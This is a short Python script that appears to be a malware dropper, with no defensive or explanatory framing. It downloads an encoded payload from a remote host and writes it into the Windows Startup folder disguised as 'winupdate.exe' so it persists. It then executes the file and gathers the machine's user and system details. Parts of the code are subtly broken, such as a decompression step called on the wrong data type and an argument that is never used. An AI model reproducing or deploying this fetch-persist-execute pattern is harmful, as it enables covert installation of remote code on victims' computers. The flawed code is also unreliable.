import os
import sys
import time
import base64
import urllib.request
import zlib

def decode(data):
    return base64.b64decode(data).decode('utf-8')

def decompress(data):
    return zlib.decompress(data.encode('utf-8')).decode('utf-8')

def download_file(url):
    response = urllib.request.urlopen(url)
    return response.read()

def execute(data):
    vitals = os.name, sys.platform, os.getenv('OS'), os.getenv('SystemRoot'), os.getenv('SystemDrive'), os.getenv('USERNAME'), os.getenv('COMPUTERNAME')
    virtool = decompress(download_file('https://example.com/tool.bin'))
    virpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'winupdate.exe')
    virfile = open(virpath, 'wb')
    virfile.write(base64.b64decode(virtool))
    virfile.close()
    os.system(f'{virpath} &')

if __name__ == '__main__':
    execute(decode(download_file('https://example.com/data.bin')))